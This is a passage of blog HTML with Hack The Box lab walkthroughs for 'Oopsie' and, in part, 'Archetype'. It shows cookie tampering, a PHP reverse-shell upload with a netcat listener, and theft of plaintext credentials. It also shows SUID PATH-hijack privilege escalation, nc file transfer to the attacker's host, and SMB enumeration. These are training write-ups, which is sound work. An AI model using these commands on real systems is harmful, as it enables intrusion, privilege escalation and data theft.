loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width: 100%;"><div style="display: inline-flex; max-width: 100%;"><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Intruder options - Payload Positions</div><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Enter a caption for this image (optional)</div></div></span></figcaption></figure><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-16.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="843" height="411" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-16.png 600w, http://192.168.8.3:2368/content/images/2021/05/image-16.png 843w" sizes="(min-width: 720px) 720px"></figure><p>Let&apos;s start the attack.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MYPAy_4MiWDii2x1cWn%2F-MYPjyb1qQ1XoeO7UbEy%2Fimage.png?alt=media&amp;token=b7249a5a-8c00-41d6-82d4-9b95c49f78e3" class="kg-image" alt="Oopsie Walkthrough" loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width: 100%;"><div style="display: inline-flex; max-width: 100%;"><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Attack Result Set</div><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Enter a caption for this image (optional)</div></div></span></figcaption></figure><p>Above I sorted the output result by the length, There are more users and now I got a super admin Access ID and Email. So let&apos;s jump back to the upload section again. But now we intercept the web traffic through burp proxy.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MYPAy_4MiWDii2x1cWn%2F-MYPkyGOXE29s6ApSZgv%2Fimage.png?alt=media&amp;token=27e9fe8d-51f4-4b7d-a4ba-aed6de7831b3" class="kg-image" alt="Oopsie Walkthrough" loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width: 100%;"><div style="display: inline-flex; max-width: 100%;"><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Enter a caption for this image (optional)</div></div></span></figcaption></figure><p>When you refresh the page you can see the cookie contain something like user id and role. so let&apos;s alter those values by super admin and then click forward the traffic.</p><blockquote>I was done this using match and replace method on burp. it will be more quick rather than intercept request one by one.</blockquote><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-17.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1219" height="332" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-17.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-17.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-17.png 1219w" sizes="(min-width: 720px) 720px"></figure><hr><h2 id="02-foothold">02. Foothold</h2><p>Let&apos;s bump to the upload page, and now it accessible.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MZSt7UdnB1ieM7P581_%2F-MZSuR_Q0y8Wo26BwTQF%2Fimage.png?alt=media&amp;token=9e9655cc-363d-4163-addf-6d02a3e0505e" class="kg-image" alt="Oopsie Walkthrough" loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width: 100%;"><div style="display: inline-flex; max-width: 100%;"><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Enter a caption for this image (optional)</div></div></span></figcaption></figure><p>Let&apos;s check whether we can upload PHP web shell or what kind of file type are they need to be uploaded. First copy the PHP Reverse shell to our current directory.</p><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;Hidd3nWiki)-[~/Documents/Oopsie]
&#x2514;&#x2500;# cp /usr/share/webshells/php/php-reverse-shell.php .</code></pre><p>Then we can open that <code>php-reverse-shell.php</code> whatever text editor you like and edit the below changes. &#x1F447;</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-18.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="484" height="118"></figure><p>And I rename that file to <code>hiddenwiki.php</code>. Let&apos;s upload the file.</p><blockquote>Note : You must change the cookie to super admin do upload the file. but in my case it is auto replace by burp match and replace.</blockquote><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-19.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1889" height="523" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-19.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-19.png 1000w, http://192.168.8.3:2368/content/images/size/w1600/2021/05/image-19.png 1600w, http://192.168.8.3:2368/content/images/2021/05/image-19.png 1889w" sizes="(min-width: 720px) 720px"></figure><p>File has been uploaded, Now we need to find where the file is.</p><p>We have lots of fuzzing tools, but I personally love <a href="https://twitter.com/_maurosoria" rel="noopener noreferrer">Mauro Soria&apos;s</a> <a href="https://github.com/maurosoria/dirsearch" rel="noopener noreferrer">Dirsearch </a>tool. it has amazing output and also can customize the script because it was written using python3. For the wordlist I used <a href="https://danielmiessler.com/" rel="noopener noreferrer">Daniel Miessler&apos;s</a> <a href="https://github.com/danielmiessler/SecLists" rel="noopener noreferrer">SecLists</a>.</p><p>Now power up the <code>dirsearch </code>tool and wait for the results.</p><pre><code class="language-bash">dirsearch.py -u http://10.10.10.28/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
</code></pre><p>From the beginning of the results we got directory called <code>uploads</code>.</p><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;Hidd3nWiki)-[~/Documents/Oopsie]
&#x2514;&#x2500;# /opt/dirsearch/dirsearch.py -u http://10.10.10.28/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt                                                                              1 &#x2A2F;

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js, txt, xhtml | HTTP method: GET | Threads: 30 | Wordlist size: 560493

Error Log: /opt/dirsearch/logs/errors-21-04-16_09-31-10.log

Target: http://10.10.10.28/

Output File: /opt/dirsearch/reports/10.10.10.28/_21-04-16_09-31-11.txt

[09:31:11] Starting:
[09:31:16] 403 -  276B  - /js/     (Added to queue)
[09:31:16] 301 -  307B  - /js  -&gt;  http://10.10.10.28/js/
[09:31:17] 403 -  276B  - /images/     (Added to queue)
[09:31:17] 403 -  276B  - /css/     (Added to queue)
[09:31:17] 301 -  308B  - /css  -&gt;  http://10.10.10.28/css/
[09:31:18] 301 -  311B  - /images  -&gt;  http://10.10.10.28/images/
[09:31:18] 301 -  311B  - /themes  -&gt;  http://10.10.10.28/themes/     (Added to queue)
[09:31:18] 403 -  276B  - /themes/
[09:31:22] 301 -  312B  - /uploads  &#x1F448;-&gt;  http://10.10.10.28/uploads/     (Added to queue)
[09:31:22] 403 -  276B  - /uploads/
[09:31:37] 200 -   11KB - /index.php
[09:31:40] 403 -  276B  - /fonts/     (Added to queue)
[09:31:40] 301 -  310B  - /fonts  -&gt;  http://10.10.10.28/fonts/</code></pre><p>Now it&apos;s time to powerup netcat listener and we can use curl command to fetch the uploaded file.</p><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;Hidd3nWiki)-[~/Documents/Oopsie]
&#x2514;&#x2500;# nc -lvnp 4444
listening on [any] 4444 ...</code></pre><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;Hidd3nWiki)-[~/Documents/Oopsie]
&#x2514;&#x2500;# curl http://10.10.10.28/uploads/hiddenwiki.php</code></pre><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-20.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1442" height="386" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-20.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-20.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-20.png 1442w" sizes="(min-width: 720px) 720px"></figure><p>We land a shell as <code>www-data</code> and proceed to upgrade it. Type below command to spawn our shell &#x1F447;</p><pre><code class="language-bash">python3 -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</code></pre><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;Hidd3nWiki)-[~/Documents/Oopsie]
&#x2514;&#x2500;# nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.101] from (UNKNOWN) [10.10.10.28] 53294
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 12:18:36 up  5:32,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can&apos;t access tty; job control turned off
$ python3 -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;
www-data@oopsie:/$ pwd
pwd
/
www-data@oopsie:/$</code></pre><p>First check web user directory where it has some interesting information.</p><pre><code class="language-bash">www-data@oopsie:/var/www/html/cdn-cgi/login$ ls
ls
admin.php  db.php  index.php  script.js</code></pre><p>Here we found <code>db.php</code> file in <code>/var/www/html/cdn-cgi/</code>login directory. let&apos;s view this file.</p><pre><code class="language-bash">www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php
cat db.php
&lt;?php
$conn = mysqli_connect(&apos;localhost&apos;,&apos;robert&apos;,&apos;M3g4C0rpUs3r!&apos;,&apos;garage&apos;);
?&gt;</code></pre><p>Oh! here we found new user credentials.</p><ul><li>robert:M3g4C0rpUs3r!</li></ul><p>So let&#x2019;s access Robert&#x2019;s user, providing the password found. <code>su robert</code></p><pre><code class="language-bash">www-data@oopsie:/var/www/html/cdn-cgi/login$ su robert
su robert
Password: M3g4C0rpUs3r!

robert@oopsie:/var/www/html/cdn-cgi/login$</code></pre><p>Yes it works and now we are in robert user. we can view our user flag now. Let&apos;s check and submit it to HTB.</p><pre><code class="language-bash">robert@oopsie:~$ cat user.txt
cat user.txt
f2c74*******************b7981</code></pre><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-21.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="545" height="269"></figure><h2 id="03-privilege-escalation">03. Privilege Escalation</h2><p>Now we are on the last step. we need to find root flag.</p><p>Now we are robert. So again, look around the file system, First we can use <code>id </code>command to verify in which user group we are now. Let&apos;s check it.</p><pre><code class="language-bash">robert@oopsie:/$ id
id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)</code></pre><p>As above result; we see that this robert is part of a <code>bugtrack </code>group. Now let&apos;s check for what files this group has the access.</p><pre><code class="language-bash">find / -type f -group bugtracker 2&gt; /dev/null</code></pre><pre><code class="language-bash">robert@oopsie:/$ find / -type f -group bugtracker 2&gt; /dev/null
find / -type f -group bugtracker 2&gt; /dev/null
/usr/bin/bugtracker</code></pre><p>There is a binary file called<code>bugtracker</code> and also we notice that it has SUID permissions.</p><pre><code class="language-bash">robert@oopsie:/$ ls -l /usr/bin/bugtracker
ls -l /usr/bin/bugtracker
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker</code></pre><blockquote>The &#x2018;s&#x2019; in the user &#x2018;execute&#x2019; field, it runs &#x2018;as&#x2019; its creator, in this case, root. &#x1F60B;&#x1F60B;&#x1F60E;</blockquote><p>Let&apos;s run the file and check what are the mess around that file.</p><pre><code class="language-bash">robert@oopsie:/$ /usr/bin/bugtracker
/usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 000
000
---------------

cat: /root/reports/000: No such file or directory</code></pre><p>Nothing interesting found. let&apos;s check <code>strings </code>command to analyze the binary file for any hard-coded information.</p><pre><code class="language-bash">strings /usr/bin/bugtracker</code></pre><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-22.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="464" height="277"></figure><p>When looking around the output, you can see that it looks like a system command which is calling the <code>cat </code>command using the relative path instead of the absolute path. So what&apos;s on your mind now. yes we can create malicious file called cat and modifying the path to include the current working directory. Using that method we can abuse this misconfiguration and escalate our privileges to root.</p><p>Let&apos;s create the file, make it as executable and add the current working directory to PATH.</p><pre><code class="language-bash">cd /tmp/
echo &apos;/bin/sh&apos; &gt; cat
chmod +x cat
export PATH=/tmp:$PATH</code></pre><p>Now let&apos;s run the<code> /usr/bin/bugtracker</code> binary again.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MZSgSPKjNqQ-mEDVXhy%2F-MZSoGcsrdEUcsi2kygI%2Fimage.png?alt=media&amp;token=c710b183-2f75-4ea4-8855-4b7905933303" class="kg-image" alt="Oopsie Walkthrough" loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width: 100%;"><div style="display: inline-flex; max-width: 100%;"><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Enter a caption for this image (optional)</div></div></span></figcaption></figure><p>Now we are landing as root. The last step; let&apos;s check the root flag and submit it to the HTB.</p><blockquote>Here I was unable to view the root.txt flag using cat,vi,nano commands. so instead of view the flag, I&apos;m going to use netcat and get that file to my host.</blockquote><p>-- On the receiving end (My host)</p><pre><code class="language-bash">nc -l -p 7878 &gt; root.txt</code></pre><p>-- On the sending end (Oopsie machine)</p><pre><code class="language-bash">nc -w 3 destination-ip 7878 &lt; root.txt</code></pre><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-23.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="717" height="396" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-23.png 600w, http://192.168.8.3:2368/content/images/2021/05/image-23.png 717w"></figure><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-24.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="858" height="636" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-24.png 600w, http://192.168.8.3:2368/content/images/2021/05/image-24.png 858w" sizes="(min-width: 720px) 720px"></figure><hr><h2 id="04-post-exploitation">04. Post Exploitation</h2><p>Inside root&apos;s folder, we see a <code>.config </code>folder, which contains a <code>FileZilla</code> config file with the credentials <code>ftpuser : mc@F1l3ZilL4</code> visible in plain text.</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-25.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1742" height="642" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-25.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-25.png 1000w, http://192.168.8.3:2368/content/images/size/w1600/2021/05/image-25.png 1600w, http://192.168.8.3:2368/content/images/2021/05/image-25.png 1742w" sizes="(min-width: 720px) 720px"></figure><p>That&#x2019;s all for now! We&#x2019;ll keep in mind that some of the info collected (like credentials, folders&#x2026;) can be useful in the next 7 labs of the &#x2018;Starting Point&#x2019; path. Thanks for reading and happy hacking!</p><p><strong>Find me on </strong><a href="https://twitter.com/ShapManasick" rel="noopener noreferrer">@twitter</a></p>]]></content:encoded></item><item><title><![CDATA[Archetype Walkthrough]]></title><description><![CDATA[Here I will begin with the path of "Starting Point". Basically it’s a series of 9 machines rated easy that should be rooted in a sequence.]]></description><link>http://192.168.8.3:2368/starting-point-htb-archetype-walkthrough/</link><guid isPermaLink="false">60ae92e354f7b1d506ddb87f</guid><category><![CDATA[StartingPoint]]></category><category><![CDATA[HackTheBox]]></category><category><![CDATA[Archetype Walkthrough]]></category><category><![CDATA[h4rithd]]></category><category><![CDATA[HarithDilshan]]></category><dc:creator><![CDATA[Harith Dilshan]]></dc:creator><pubDate>Wed, 14 Apr 2021 18:47:00 GMT</pubDate><media:content url="http://192.168.8.3:2368/content/images/2021/05/1-1.jpg" medium="image"/><content:encoded><![CDATA[<img src="http://192.168.8.3:2368/content/images/2021/05/1-1.jpg" alt="Archetype Walkthrough"><p>Here I will begin with the path of &quot;Starting Point&quot;. Basically it&#x2019;s a series of 9 machines rated easy that should be rooted in a sequence.</p><hr><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-2.png" class="kg-image" alt="Archetype Walkthrough" loading="lazy" width="999" height="759" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-2.png 600w, http://192.168.8.3:2368/content/images/2021/05/image-2.png 999w" sizes="(min-width: 720px) 720px"></figure><p>They will provide official walkthroughs for each 9 machines. As I think it will be very helpful for noob to understand the platform, techniques and more about HTB. And when it comes to noob, no one is here to find just zero-day vulnerabilities. So from my perspective, it&apos;s fine to read each and every walkthroughs provided by HTB and others to understand by yourself. <em>&quot;Walkthroughs are the teachers&quot;.</em></p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-3.png" class="kg-image" alt="Archetype Walkthrough" loading="lazy" width="1202" height="328" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-3.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-3.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-3.png 1202w" sizes="(min-width: 720px) 720px"></figure><p>Enough talks &#x1F971;, let&apos;s start to hack. &#x1F431;&#x200D;&#x1F4BB;</p><blockquote>Disclaimers: No flags (user/root) are shown in this writeup (as usual in writeups), so follow the procedures to grab the flags! &#x1F431;&#x200D;&#x1F464;</blockquote><hr><h2 id="00-start-machine-%E2%80%A6">00. Start Machine &#x2026;</h2><p>To start machine, Just click &quot;Join Machine&quot;.</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-4.png" class="kg-image" alt="Archetype Walkthrough" loading="lazy" width="1633" height="751" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-4.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-4.png 1000w, http://192.168.8.3:2368/content/images/size/w1600/2021/05/image-4.png 1600w, http://192.168.8.3:2368/content/images/2021/05/image-4.png 1633w" sizes="(min-width: 720px) 720px"></figure><p>Then you can see the <strong>IP </strong>address for that machine. usually it is<strong> 10.10.10.27 &#x1F920;</strong></p><p>Before going to enumeration steps we can simply ping to the IP address and check our VPN connection and whether machine is alive. Sometimes machines might &quot;Disable&quot; ping requests from passing through the firewall. But in most case ping will be a success!</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype
&#x26A1;&#x276F; ping 10.10.10.27 -c 2
PING 10.10.10.27 (10.10.10.27) 56(84) bytes of data.
64 bytes from 10.10.10.27: icmp_seq=1 ttl=127 time=252 ms
64 bytes from 10.10.10.27: icmp_seq=2 ttl=127 time=251 ms

--- 10.10.10.27 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 250.934/251.550/252.167/0.616 ms
--------------------------------------------------------------------</code></pre><hr><h2 id="01-enumeration-first-%E2%80%A6">01. Enumeration First &#x2026;</h2><h3 id="011-fast-ports-scan">01.1 Fast ports scan</h3><pre><code class="language-bash">nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.27</code></pre><pre><code class="language-bash">-n	: Never do DNS resolution
-vv	: Extra verbosity
--open	: Output only open ports
-p-	: Full TCP ports range (65535)
-T4	: Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable netwok</code></pre><p>Here is the output &#x1F447;</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype &#x1F40D; v3.9.2 
&#x26A1;&#x276F; nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.27
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-15 19:15 +0530
Initiating Ping Scan at 19:15
Scanning 10.10.10.27 [4 ports]
Completed Ping Scan at 19:15, 0.27s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 19:15
Scanning 10.10.10.27 [65535 ports]
Completed SYN Stealth Scan at 19:17, 172.44s elapsed (65535 total ports)
Nmap scan report for 10.10.10.27
Host is up, received echo-reply ttl 127 (0.67s latency).
Scanned at 2021-04-15 19:15:06 +0530 for 173s
Not shown: 65523 closed ports
Reason: 65523 resets
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
1433/tcp  open  ms-sql-s     syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
47001/tcp open  winrm        syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49668/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 172.86 seconds
           Raw packets sent: 102404 (4.506MB) | Rcvd: 93270 (3.731MB)
--------------------------------------------------------------------</code></pre><p>I have some tricky bash script to get all open ports as bash variable call &quot;ports&quot;. Somehow it will be helpful later. &#x1F60E;</p><pre><code class="language-bash">ports=$(cat AllPorts.nmap | grep ^\[0-9\] | cut -d &apos;/&apos; -f 1 | tr &apos;\\n&apos; &apos;,&apos; | sed s/,$//)
</code></pre><p>Yes, we can simply combine those two lines into one. But I need to see results quickly. That&apos;s why I divide it into two parts. If you want it in one line, you can use &#x1F447;&#x1F447;</p><pre><code class="language-bash">ports=$(nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.27 | grep ^[0-9] | cut -d &apos;/&apos; -f 1 | tr &apos;\n&apos; &apos;,&apos; | sed s/,$//)&quot; 
</code></pre><p>Here is the output &#x1F447;</p><pre><code class="language-sql">root in ~/Documents/HackThebox/Archetype &#x1F40D; v3.9.2  took 2m52s
&#x26A1;&#x276F; more AllPorts.nmap
# Nmap 7.91 scan initiated Thu Apr 15 19:15:06 2021 as: nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.27
Nmap scan report for 10.10.10.27
Host is up, received echo-reply ttl 127 (0.67s latency).
Scanned at 2021-04-15 19:15:06 +0530 for 173s
Not shown: 65523 closed ports
Reason: 65523 resets
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 127 * (Interesting)
139/tcp   open  netbios-ssn  syn-ack ttl 127 * (Interesting)
445/tcp   open  microsoft-ds syn-ack ttl 127 * (Interesting)
1433/tcp  open  ms-sql-s     syn-ack ttl 127 * (Interesting)
5985/tcp  open  wsman        syn-ack ttl 127 * (Interesting)
47001/tcp open  winrm        syn-ack ttl 127 * (Interesting)
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49668/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127</code></pre><p>Here we can see some &#xA0;<strong>* (Interesting)</strong> ports. others can be avoid.</p><h3 id="012-run-nmap-scripting-engine">01.2 Run Nmap Scripting Engine</h3><p>To get the best result we can run the <code>Nmap Scripting Engine</code> for all open ports. Now we know all open ports so that we can point out and run the script engine as fast as possible.</p><pre><code class="language-bash">nmap -sV -sC -oN DetailPorts.nmap -p$ports 10.10.10.27 </code></pre><pre><code class="language-bash">-sV	: Service fingerprinting
-sC	: Launch default NSE nmap scripts</code></pre><p>Most of the case this will be end up an error because of $ports variable. This is not the right time to fix it so if you get any error, run the command without $ports variable and point out all ports.</p><pre><code class="language-bash">nmap -sV -sC -oN DetailPorts.nmap -p 135,139,455,1433 10.10.10.27 </code></pre><p>Here is the output &#x1F447;</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype &#x1F40D; v3.9.2
&#x26A1;&#x276F; nmap -sV -sC -oN DetailPorts.nmap -p 135,139,455,1433 10.10.10.27
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-15 19:38 +0530
Nmap scan report for 10.10.10.27
Host is up (0.52s latency).

PORT     STATE  SERVICE        VERSION
135/tcp  open   msrpc          Microsoft Windows RPC
139/tcp  open   netbios-ssn    Microsoft Windows netbios-ssn
455/tcp  closed creativepartnr
1433/tcp open   ms-sql-s       Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info:
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-04-15T14:30:06
|_Not valid after:  2051-04-15T14:30:06
|_ssl-date: 2021-04-15T14:30:34+00:00; +21m39s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 21m39s, deviation: 0s, median: 21m38s
| ms-sql-info:
|   10.10.10.27:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_smb2-security-mode: SMB: Couldn&apos;t find a NetBIOS name that works for the server. Sorry!
|_smb2-time: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.24 seconds</code></pre><p>Now we know the OS is Windows (Microsoft SQL Server 2017 RTM) and it has SMB (1433) port open. And lets enumerate further. Remember enumerating is the key! &#x1F511;</p><h3 id="013-list-all-available-shares">01.3 List all available shares</h3><p>So here it has smb (1433) port open. I used smbclient to list out all the available shares as anonymous user.</p><pre><code class="language-bash">sudo smbclient -N -L 10.10.10.27</code></pre><pre><code class="language-bash">-N	: Don&apos;t ask for a password
-L	: Get a list of shares available on a host</code></pre><p>Here is output &#x1F447;</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype &#x1F40D; v3.9.2
&#x26A1;&#x276F; sudo smbclient -N -L 10.10.10.27

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available</code></pre><p>Here we got something very interesting right? There is only single share &#x2018;<strong>backups</strong>&#x2019; accessible with no passwords. so let&apos;s try to access it and see what&apos;s inside.&#x1F60E;&#x1F60B;</p><pre><code class="language-bash">smbclient -N \\\\10.10.10.27\\backups\\</code></pre><p>So now we are done with SMB shell and there is a file called &#x2018;prod.dtsConfig&apos;. so let&apos;s download it.</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype &#x1F40D; v3.9.2
&#x26A1;&#x276F; smbclient -N \\\\10.10.10.27\\backups\\
Try &quot;help&quot; to get a list of possible commands.
smb: \&gt; dir
  .                                   D        0  Mon Jan 20 17:50:57 2020
  ..                                  D        0  Mon Jan 20 17:50:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 17:53:02 2020

                10328063 blocks of size 4096. 8203982 blocks available
smb: \&gt; get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \&gt;</code></pre><pre><code class="language-bash">smb: \&gt; dir	: List all directories
smb: \&gt; get	&lt;file-name&gt; : Download file</code></pre><p>Now we can open prod.dtsConfig file and yeah that &#x2018;prod.dtsConfig&#x2019; file contains a SQL connection string, containing credentials for the local Windows user <strong>ARCHETYPE\sql_svc</strong> &#x1F942;.</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype &#x1F40D; v3.9.2  took 5m55s
&#x26A1;&#x276F; more prod.dtsConfig
&lt;DTSConfiguration&gt;
    &lt;DTSConfigurationHeading&gt;
        &lt;DTSConfigurationFileInfo GeneratedBy=&quot;...&quot; GeneratedFromPackageName=&quot;...&quot; GeneratedFromPackageID=&quot;...&quot; GeneratedDate=&quot;20.1.2019 10:01:34&quot;/&gt;
    &lt;/DTSConfigurationHeading&gt;
    &lt;Configuration ConfiguredType=&quot;Property&quot; Path=&quot;\Package.Connections[Destination].Properties[ConnectionString]&quot; ValueType=&quot;String&quot;&gt;
